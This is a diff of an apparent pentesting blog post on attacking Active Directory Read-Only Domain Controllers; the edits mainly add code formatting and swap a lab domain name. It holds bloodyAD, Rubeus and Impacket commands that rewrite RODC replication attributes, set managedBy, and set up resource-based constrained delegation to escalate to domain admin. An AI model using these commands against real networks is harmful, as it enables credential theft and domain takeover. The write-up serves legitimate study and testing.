@@ -46,9 +46,9 @@ and two other attributes that are related to the PRP:
 - msDS-AuthenticatedToAccountList, also known as the Authenticated to List
 
 
-The msDS-RevealOnDemandGroup attribute specifies which users can have their passwords cached on an RODC. By default, this attribute has one value, which is the Allowed RODC Password Replication Group. Because this domain local group has no members by default, no account passwords can be cached on any RODC by default.
+The `msDS-RevealOnDemandGroup` attribute specifies which users can have their passwords cached on an RODC. By default, this attribute has one value, which is the Allowed RODC Password Replication Group. Because this domain local group has no members by default, no account passwords can be cached on any RODC by default.
 
-The msDS-NeverRevealGroup attribute specifies which users are explicitly denied from their passwords copied to RODC. By default, this attribute has one value, which is the Denied RODC Password Replication Group. The following accounts or groups are included by default. It's important to note that "deny" always takes priority over "allow."
+The `msDS-NeverRevealGroup` attribute specifies which users are explicitly denied from their passwords copied to RODC. By default, this attribute has one value, which is the Denied RODC Password Replication Group. The following accounts or groups are included by default. It's important to note that "deny" always takes priority over "allow."
 
 - Enterprise Domain Controllers
 
@@ -66,11 +66,11 @@ The msDS-NeverRevealGroup attribute specifies which users are explicitly denied 
 
 - Domain-wide krbtgt account
 
-The msDS-RevealedList is the list of user and computer accounts whose current credentials have been replicated to the RODC.
+The `msDS-RevealedList` is the list of user and computer accounts whose current credentials have been replicated to the RODC.
 
 ### RODC ManagedBy
 
-The managedBy attribute does not usually serve any function for an AD object, although it can be used for organizational purposes. However, RODC computer objects are the exception. Any user or group specified in the managedBy attribute of an RODC has local admin access to the RODC server.
+The managedBy attribute does not usually serve any function for an AD object, although it can be used for organizational purposes. However, RODC computer objects are the exception. Any user or group specified in the managedBy attribute of an RODC has `local admin access` to the RODC server.
 
 ## Attacking RODCs
 
@@ -114,7 +114,7 @@ Rubeus.exe asktgs /enctype:aes256 /keyList /ticket:ticket.kirbi /service:krbtgt/
 
 With control over the RODC computer object in the Active Directory, it is possible to fully compromise the domain. It is possible to modify the RODC’s msDS-NeverRevealGroup and msDS-RevealOnDemandGroup attributes to allow a Domain Admin to authenticate and dump his credentials via administrative access over the RODC host.
 
-For more granularity, one of the ACEs below against the RODC object is initially sufficient, since they will implicitly allow WriteProperty against the msDS-RevealOnDemandGroup and msDS-NeverRevealGroup attributes:
+For more granularity, one of the ACEs below against the RODC object is initially sufficient, since they will implicitly allow `WriteProperty` against the `msDS-RevealOnDemandGroup` and `msDS-NeverRevealGroup` attributes:
 
 - GenericWrite
 - GenericAll
@@ -125,15 +125,15 @@ For more granularity, one of the ACEs below against the RODC object is initially
 
 `PowerView.py` or `bloodyAD` can be used in UNIX-like systems and `PowerView.ps1` in Windows systems.
 
-Add target account to msDS-RevealOnDemandGroup attribute
+Add target account to `msDS-RevealOnDemandGroup` attribute
 ```bash
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'
 ```
-Also remove the target account from msDS-NeverRevealGroup attribute if needed
+Also remove the target account from `msDS-NeverRevealGroup` attribute if needed
 ```bash
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-NeverRevealGroup
 ```
-Then, dump the krbtgt_XXXX key on the RODC server with admin access on the host (e.g. by modifying the managedBy attribute), and use key list attack to retrieve the domain Administrator's password hash.
+Then, dump the `krbtgt_XXXX key` on the RODC server with admin access on the host (e.g. by modifying the managedBy attribute), and use key list attack to retrieve the domain Administrator's password hash.
 
 ```bash
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr managedBy -v 'CN=USERNAME,CN=Users,DC=domain,DC=local'
@@ -145,14 +145,14 @@ If an attacker gains control of the RODC Administrators user or group object wit
 
 Users or groups delegated with RODC administrative privileges, most of the time will have `WriteAccountRestrictions` or `WriteProperty` over `managedBy` or both at the same time. These DACLs contain sufficient permissions to escalate to admin on RODC. 
 
-We have already done managedBy abuse so let's continue with WriteAccountRestrictions.
+We have already done managedBy abuse so let's continue with `WriteAccountRestrictions`.
 
 
-Suppose we have a user who has AddSelf right over RODC Administrators Group.
+Suppose we have a user who has `AddSelf` right over `RODC Administrators` group.
 
 ![w1](/assets/img/windows/rodc/3.png){: width="800" height="500" }
 
-Add ourself to group using bloodyAD.
+Add ourself to group using `bloodyAD`.
 
 ```bash
 bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" add groupMember 'RODC Administrators' "$TargetUser"
@@ -167,21 +167,21 @@ bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get writable --d
 
 ![w1](/assets/img/windows/rodc/4.png){: width="800" height="500" }
 
-As we can see, we can write to msDS-AllowedToActOnBehalfOfOtherIdentity. Using this we can do Resource Based Constrained Delegation (RBCD).
+As we can see, we can write to `msDS-AllowedToActOnBehalfOfOtherIdentity`. Using this we can do `Resource Based Constrained Delegation` (RBCD).
 
-Use impacket-addcomputer to create a new computer account.
+Use `impacket-addcomputer` to create a new computer account.
 ```text
                                                                                                                                                                                         
 ┌──(suce㉿kali)-[~/Desktop]
-└─$ impacket-addcomputer 'domain.local/suce:Password123!' -domain garfield.htb -computer-name 'comp$' -computer-pass 'Password123!'
+└─$ impacket-addcomputer 'domain.local/suce:Password123!' -domain domain.local -computer-name 'comp$' -computer-pass 'Password123!'
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Successfully added machine account comp$ with password Password123!.
 ```
-Add the SID of comp$ to the msDS-AllowedToActOnBehalfOfOtherIdentity property of RODC to set the Kerberos RBCD.
+Using `impacket-rbcd`, add the SID of comp$ to the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of RODC to set the Kerberos RBCD.
 ```text
 ┌──(suce㉿kali)-[~/Desktop]
-└─$ impacket-rbcd -delegate-from "comp$" -delegate-to "rodc01$" -dc-ip "$DC_IP" -action 'write' 'garfield.htb/suce:Password123!'
+└─$ impacket-rbcd -delegate-from "comp$" -delegate-to "rodc01$" -dc-ip "$DC_IP" -action 'write' 'domain.local/suce:Password123!'
 Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
